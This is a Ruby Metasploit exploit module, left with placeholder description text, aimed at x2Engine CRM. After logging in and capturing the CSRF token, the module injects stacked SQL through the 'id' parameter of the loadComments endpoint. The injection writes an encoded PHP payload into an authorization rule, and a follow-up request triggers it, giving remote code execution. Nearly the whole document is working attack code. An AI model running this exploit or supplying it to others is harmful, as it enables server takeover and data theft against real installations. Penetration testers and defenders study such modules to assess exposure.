##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Empty Exploit Module',
      'Description' => %q{
    This is a short description for an exploit module.

    A longer description follows the short description,
    going into more detail about the vulnerability being
    exploited, the module, or any other useful documentation.

    Categories: Open Source

    Price: 0

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => ''))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base x2Engine CRM directory path", '/']),
        OptString.new('USERNAME', [true, 'The username to authenticate with', 'user']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def exploit
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', 'site', 'login')
    })

    cookie = res.get_cookies
    csrf = $1 if cookie =~ /YII_CSRF_TOKEN=(.*?);/

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', 'site', 'login'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        'YII_CSRF_TOKEN' => csrf,
        'LoginForm[username]' => datastore['USERNAME'],
        'LoginForm[password]' => datastore['PASSWORD'],
        'LoginForm[twoFactorCode]' => '',
        'LoginForm[rememberMe]' => '',
        'geoCoords' => ''
      }
    })

    unless res.code == 302
      fail_with(Failure::Unknown, "Authentication failed")
    end

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'profile', 'loadComments'),
      'vars_get' => {
        'id' => "1;UPDATE x2_auth_item SET bizrule = '#{payload.encoded}' WHERE name = 'UsersIndex'; # ",
        'profileId' => 1
      },
      'cookie' => cookie
    })

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php', 'site', 'login'),
      'method' => 'POST'
    })

  end
end
